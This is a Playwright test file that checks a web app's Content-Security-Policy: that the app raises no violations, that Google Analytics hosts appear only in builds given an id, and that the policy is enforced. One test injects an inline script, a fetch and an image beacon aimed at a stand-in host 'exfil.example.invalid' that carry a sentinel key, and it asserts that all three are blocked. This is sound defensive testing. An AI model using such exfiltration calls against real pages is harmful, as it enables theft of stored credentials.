// SPDX-License-Identifier: AGPL-3.0-or-later
import { test, expect } from '@playwright/test'
import { readFileSync } from 'node:fs'
import { join } from 'node:path'

/**
 * `TODO/ai-004`, `docs/decisions/ai-partner.md` decision 8 — the Content-Security-Policy
 * meta tag, verified **against the running app** in each engine:
 *
 * 1. **The app violates none of it.** Loading a scene (the evaluation worker), exporting an STL
 *    (the export worker and a `blob:` download), opening the File menu and the Assistant key
 *    sheet raises no `securitypolicyviolation` event and no "Content Security Policy" console
 *    error. Gist loading and the PWA service worker are the other parts the decision names as
 *    likely to need an entry: this app has no gist loader yet (grep-checked), and the service
 *    worker is registered only by the production build (checked against `vite preview`; see the
 *    task's retirement note).
 * 2. **The policy is live.** Script injected into the page cannot run inline code, cannot
 *    `fetch` an unlisted host (so it cannot post the stored key anywhere), and cannot beacon the
 *    key out through an image — each attempt raises the matching violation. That is the whole
 *    point of the policy, so it is asserted rather than assumed. No request leaves the browser:
 *    the policy blocks them first.
 *
 * ## Engines and viewports, stated (`CLAUDE.md`)
 *
 * All three engines: CSP enforcement and its violation events are engine-specific (WebKit and
 * Firefox differ on `blob:` workers, `ws:` versus `'self'` and inline styles). Viewport-agnostic
 * (no layout assertion), so it runs in the standard matrix without a snapshot. Firefox may fail
 * to launch in this sandbox (`TROUBLESHOOTING.md`).
 */

/** `TODO/build-007`: the GA4 measurement id the production build was given, if any (build-time only). */
const GA_ID = (process.env.GA_MEASUREMENT_ID ?? process.env.VITE_GA_MEASUREMENT_ID ?? '').trim()
const GA_CONNECT = ['https://*.google-analytics.com', 'https://*.analytics.google.com']
const GA_SCRIPT = 'https://www.googletagmanager.com'
const PREVIEW = process.env.E2E_PREVIEW === '1'

const FIXTURE = join(process.cwd(), 'e2e', 'docs', 'fixtures', 'cube-and-cylinder.ndjson')

test.beforeEach(async ({ page }) => {
  await page.addInitScript(() => {
    Object.defineProperty(window, 'showSaveFilePicker', { value: undefined, configurable: true })
    Object.defineProperty(window, 'showOpenFilePicker', { value: undefined, configurable: true })
    window.__cspViolations = []
    document.addEventListener('securitypolicyviolation', (event) =>
      window.__cspViolations.push({ directive: event.violatedDirective, blocked: event.blockedURI }),
    )
  })
})

/** @param {import('@playwright/test').Page} page */
const violations = (page) => page.evaluate(() => window.__cspViolations)

test('the policy is present on the page the browser actually loaded', async ({ page }) => {
  await page.goto('/')
  const content = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content')
  expect(content).toContain("connect-src 'self'")
  expect(content).toContain('https://api.anthropic.com')
  expect(content).toContain('https://api.github.com')
  expect(content).not.toMatch(/script-src[^;]*unsafe-inline/)
  // `TODO/build-004`: connect-src is exactly 'self', the two API hosts, the gist raw host
  // (`TODO/io-017`: a truncated gist file's full text) and — only when the build was given a
  // Sentry DSN — that DSN's own https host. Nothing broader (no `https:`, no `*`).
  const connect = content.split(';').map((d) => d.trim()).find((d) => d.startsWith('connect-src')) ?? ''
  const sources = connect.split(/\s+/).slice(1).filter((source) => !/^wss?:/.test(source))
  expect(sources).toContain('https://gist.githubusercontent.com')
  const extras = sources.filter(
    (source) => !["'self'", 'https://api.anthropic.com', 'https://api.github.com', 'https://gist.githubusercontent.com'].includes(source),
  )
  expect(sources).not.toContain('https:')
  // `TODO/build-007`: the only wildcards are Google's two single-label Analytics collection hosts,
  // and only in a build given a GA4 measurement id.
  const wildcards = sources.filter((source) => source.includes('*'))
  const dsn = process.env.VITE_SENTRY_DSN ?? ''
  if (process.env.E2E_PREVIEW === '1') {
    const sentry = dsn ? ['https://' + new URL(dsn).hostname] : []
    expect(extras).toEqual([...sentry, ...(GA_ID ? GA_CONNECT : [])])
    expect(wildcards).toEqual(GA_ID ? GA_CONNECT : [])
    if (dsn) expect(extras[0]).toMatch(/\.sentry\.io$/)
  } else {
    expect(extras.length).toBeLessThanOrEqual(3)
  }
  // The dev server relaxes exactly two things (vite.config.js); the production build — which
  // `E2E_PREVIEW=1` serves — carries the policy exactly as written in index.html.
  if (process.env.E2E_PREVIEW === '1') expect(content).not.toMatch(/unsafe-eval|ws:/)
  else expect(content).toMatch(/script-src 'self' 'unsafe-eval'/)
})

test('the running app violates nothing: scene load, STL export, File menu and Assistant sheet', async ({ page }) => {
  const consoleErrors = []
  page.on('console', (message) => {
    if (message.type() === 'error' || message.type() === 'warning') consoleErrors.push(message.text())
  })
  page.on('pageerror', (error) => consoleErrors.push(String(error)))
  await page.goto('/')
  const viewport = page.getByTestId('viewport')
  await expect(viewport).toHaveAttribute('data-webgl', 'ready')

  // Scene load: File ▸ Open → the evaluation worker builds both bodies.
  await page.getByTestId('file-menu-button').click()
  const chooserEvent = page.waitForEvent('filechooser')
  await page.getByTestId('file-open').click()
  const chooser = await chooserEvent
  await chooser.setFiles({ name: 'cube-and-cylinder.ndjson', mimeType: 'text/plain', buffer: readFileSync(FIXTURE) })
  await expect(viewport).toHaveAttribute('data-body-count', '2')

  // STL export: the export worker and a blob: download.
  await page.getByTestId('file-menu-button').click()
  await page.getByTestId('file-export').click()
  await expect(page.getByTestId('export-popover')).toBeVisible()
  const [download] = await Promise.all([page.waitForEvent('download'), page.getByTestId('export-commit').click()])
  expect(download.suggestedFilename()).toMatch(/\.stl$/)

  // The Assistant key sheet, and a stubbed Test against the allowlisted API origin.
  // Routed on the context, not the page: the production build's service worker can issue the
  // request itself, and a page-level route never sees those (the real API answered 401 on WebKit).
  await page.context().route('https://api.anthropic.com/**', async (route) => {
    const headers = { 'access-control-allow-origin': '*', 'access-control-allow-headers': '*', 'access-control-allow-methods': 'POST, OPTIONS' }
    if (route.request().method() === 'OPTIONS') return route.fulfill({ status: 204, headers })
    return route.fulfill({ status: 200, headers: { ...headers, 'content-type': 'application/json' }, body: '{"input_tokens":8}' })
  })
  await page.getByTestId('assistant-button').click()
  await page.getByTestId('ai-key-input').fill('sk-ant-api03-csp-sentinel-0123456789')
  await page.getByTestId('ai-key-save').click()
  await expect(page.getByTestId('ai-key-status-text')).toContainText('Connected')

  expect(await violations(page)).toEqual([])
  expect(consoleErrors.filter((text) => /content security policy|refused to/i.test(text))).toEqual([])
})

test('the policy is live: inline script, an unlisted host and an image beacon are all blocked', async ({ page }) => {
  await page.goto('/')
  await expect(page.getByTestId('viewport')).toBeVisible()

  const outcome = await page.evaluate(async () => {
    // 1. Inline script injection.
    const script = document.createElement('script')
    script.textContent = 'window.__inlineRan = true'
    document.head.append(script)

    // 2. fetch to a host that is not on the allowlist (the key-exfiltration route).
    let fetchBlocked = false
    try {
      await fetch('https://exfil.example.invalid/steal?k=sentinel')
    } catch {
      fetchBlocked = true
    }

    // 3. The image beacon.
    const image = new Image()
    const imageErrored = new Promise((resolve) => {
      image.onerror = () => resolve(true)
      image.onload = () => resolve(false)
    })
    image.src = 'https://exfil.example.invalid/beacon.png?k=sentinel'
    const beaconBlocked = await Promise.race([imageErrored, new Promise((resolve) => setTimeout(() => resolve(false), 3000))])

    // Let the violation events (queued tasks) flush.
    await new Promise((resolve) => setTimeout(resolve, 100))
    return { inlineRan: window.__inlineRan === true, fetchBlocked, beaconBlocked }
  })

  expect(outcome.inlineRan).toBe(false)
  expect(outcome.fetchBlocked).toBe(true)
  expect(outcome.beaconBlocked).toBe(true)
  const seen = (await violations(page)).map((v) => v.directive.split('-')[0] + '-' + (v.directive.split('-')[1] ?? ''))
  expect(seen.some((d) => d.startsWith('script'))).toBe(true)
  expect(seen.some((d) => d.startsWith('connect'))).toBe(true)
  expect(seen.some((d) => d.startsWith('img'))).toBe(true)
})

/**
 * `TODO/build-007`: the Google Analytics allowance, asserted on the **production build** (the dev
 * server's CSP is the same text plus two relaxations, and carries no GA hosts ever). Google is
 * never contacted: every Google host is answered by a stub from `page.context().route`, so the
 * only thing proved is what the policy permits or refuses.
 *
 * - Without a measurement id (the default build): `script-src`, `connect-src` and `img-src` carry
 *   no Google host, and a gtag.js script injected into the page is refused.
 * - With one (`GA_MEASUREMENT_ID=G-TEST000000 E2E_PREVIEW=1`): exactly `www.googletagmanager.com`
 *   in `script-src`, the two collection wildcards in `connect-src`, the one in `img-src`; the
 *   stubbed gtag.js, a collect `fetch` and a collect image raise no violation, while a Google host
 *   that is not on the list (`www.google.com`) is still refused. Nothing broader (`https:`, a bare
 *   `*`) appears in any directive.
 */
function directives(content) {
  const out = {}
  for (const part of content.split(';')) {
    const [name, ...values] = part.trim().split(/\s+/)
    if (name) out[name] = values
  }
  return out
}

test('Google Analytics hosts are in the production policy only when the build was given an id', async ({ page }) => {
  test.skip(!PREVIEW, 'The dev server never carries a GA allowance; this asserts the production build.')
  await page.goto('/')
  const content = (await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content')) ?? ''
  const policy = directives(content)
  expect(content).not.toMatch(/(^|[\s;])https:([\s;]|$)/)
  expect(content).not.toMatch(/\s\*([\s;]|$)/)
  expect(policy['script-src']).toEqual(GA_ID ? ["'self'", GA_SCRIPT] : ["'self'"])
  expect(policy['img-src']).toEqual(GA_ID ? ["'self'", 'blob:', 'data:', 'https://*.google-analytics.com'] : ["'self'", 'blob:', 'data:'])
  expect(policy['connect-src'].filter((source) => /google|analytics/.test(source))).toEqual(GA_ID ? GA_CONNECT : [])
  // The production page has no tag in it either way: the app adds it at runtime, never from the HTML.
  expect(await page.locator('script[src*="googletagmanager"]').count()).toBe(0)
})

test('the policy lets a stubbed gtag.js, collect call and collect image through only in a GA build', async ({ page }) => {
  test.skip(!PREVIEW, 'Asserted on the production build only.')
  await page.context().route(/^https:\/\/([a-z0-9-]+\.)?(googletagmanager|google-analytics|analytics\.google|google)\.com\//, async (route) => {
    const headers = { 'access-control-allow-origin': '*' }
    if (route.request().resourceType() === 'script') return route.fulfill({ status: 200, headers, contentType: 'text/javascript', body: 'window.__gtagStubRan = true' })
    if (route.request().resourceType() === 'image') return route.fulfill({ status: 200, headers, contentType: 'image/gif', body: Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64') })
    return route.fulfill({ status: 204, headers })
  })
  await page.goto('/')
  await expect(page.getByTestId('viewport')).toBeVisible()
  const outcome = await page.evaluate(async () => {
    const script = document.createElement('script')
    script.src = 'https://www.googletagmanager.com/gtag/js?id=G-TEST000000'
    const scriptDone = new Promise((resolve) => {
      script.onload = () => resolve(true)
      script.onerror = () => resolve(false)
    })
    document.head.append(script)
    const refused = document.createElement('script')
    refused.src = 'https://www.google.com/other.js'
    const refusedDone = new Promise((resolve) => {
      refused.onload = () => resolve(false)
      refused.onerror = () => resolve(true)
    })
    document.head.append(refused)
    const tryFetch = (url) => fetch(url, { method: 'POST', mode: 'no-cors' }).then(() => true, () => false)
    const tryImage = (url) =>
      new Promise((resolve) => {
        const image = new Image()
        image.onload = () => resolve(true)
        image.onerror = () => resolve(false)
        image.src = url
      })
    const result = {
      scriptLoaded: await scriptDone,
      otherGoogleScriptRefused: await refusedDone,
      collectWww: await tryFetch('https://www.google-analytics.com/g/collect?v=2'),
      collectRegion: await tryFetch('https://region1.google-analytics.com/g/collect?v=2'),
      collectAnalyticsGoogle: await tryFetch('https://region1.analytics.google.com/g/s/collect?v=2'),
      otherGoogleFetch: await tryFetch('https://www.google.com/collect'),
      collectImage: await tryImage('https://region1.google-analytics.com/g/collect?v=2'),
    }
    await new Promise((resolve) => setTimeout(resolve, 100))
    return result
  })
  const blocked = (await violations(page)).map((v) => v.blocked)
  expect(outcome.otherGoogleScriptRefused).toBe(true)
  expect(outcome.otherGoogleFetch).toBe(false)
  expect(blocked.some((uri) => uri.includes('www.google.com'))).toBe(true)
  if (GA_ID) {
    expect(outcome).toMatchObject({ scriptLoaded: true, collectWww: true, collectRegion: true, collectAnalyticsGoogle: true, collectImage: true })
    expect(blocked.filter((uri) => /googletagmanager|google-analytics|analytics\.google/.test(uri))).toEqual([])
  } else {
    expect(outcome).toMatchObject({ scriptLoaded: false, collectWww: false, collectRegion: false, collectAnalyticsGoogle: false, collectImage: false })
    expect(blocked.some((uri) => uri.includes('googletagmanager'))).toBe(true)
  }
})
